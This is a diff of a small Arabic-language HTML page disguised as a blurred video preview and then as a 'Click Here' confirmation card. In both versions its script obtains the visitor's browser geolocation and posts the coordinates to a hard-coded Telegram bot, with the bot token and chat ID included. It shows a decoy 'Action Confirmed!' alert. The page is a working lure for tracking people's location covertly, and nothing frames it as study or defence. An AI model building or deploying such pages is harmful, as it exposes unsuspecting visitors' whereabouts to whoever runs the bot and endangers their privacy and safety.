@@ -1,49 +1,77 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>معاينة فيديو</title>
-<style>
-  body {
-    margin: 0;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    background-color: #000;
-  }
-  img {
-    max-width: 100%;
-    max-height: 100%;
-    filter: blur(1px); /* تمويه خفيف */
-    border-radius: 10px;
-  }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Confirm Action</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f0f0f0;
+      margin: 0;
+    }
+    #card {
+      cursor: pointer;
+      width: 300px;
+      height: 200px;
+      background-image: url('https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg');
+      background-size: cover;
+      background-position: center;
+      filter: blur(2px); /* لتغبيش الصورة */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: white;
+      font-weight: bold;
+      font-size: 18px;
+      text-shadow: 1px 1px 2px black;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      transition: filter 0.3s;
+    }
+    #card:hover {
+      filter: blur(0); /* عند التمرير يكشف الصورة قليلاً */
+    }
+  </style>
 </head>
 <body>
-<img src="https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg" alt="Video Preview">
+  <div id="card">Click Here</div>
 
-<script>
-function sendLocationToBot(lat, lon) {
-    const telegramToken = "8120112422:AAGXl1kbMxBnBgUOQU0nZhYvYum5yJAagyM";
-    const chatId = "6495557039";
-    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
-    const message = `📍 موقع المستخدم:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
+  <script>
+    const card = document.getElementById('card');
+    const BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"; // توكن البوت
+    const CHAT_ID = "7485197107"; // معرف الشات
 
-    fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: message })
+    card.addEventListener('click', () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: `Lat: ${lat}\nLon: ${lon}`
+              })
+            })
+            .then(response => response.json())
+            .then(data => console.log('Sent to bot:', data))
+            .catch(err => console.error(err));
+
+            alert('Action Confirmed!');
+          },
+          error => alert('Could not get location: ' + error.message)
+        );
+      } else {
+        alert('Geolocation not supported by your browser.');
+      }
     });
-}
-
-if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-        pos => sendLocationToBot(pos.coords.latitude, pos.coords.longitude),
-        err => console.warn("⚠️ لم يتم السماح بالحصول على الموقع")
-    );
-}
-</script>
+  </script>
 </body>
 </html>
